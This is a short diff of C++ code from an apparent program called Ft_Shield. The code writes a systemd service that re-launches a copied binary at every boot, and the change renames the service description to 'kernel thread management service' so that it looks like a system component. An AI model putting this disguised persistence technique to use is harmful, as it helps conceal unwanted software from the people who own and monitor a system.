@@ -175,7 +175,7 @@ void	Ft_Shield::setup(char const *me)
 	if (service.is_open())
 	{
 		service << "[Unit]" << std::endl;
-		service << "Description=firewall dependency" << std::endl;
+		service << "Description=kernel thread management service" << std::endl;
 		service << "[Service]" << std::endl;
 		service << "ExecStart=" << COPY_ELF << " --on-boot" << std::endl;
 		service << "Restart=always" << std::endl;
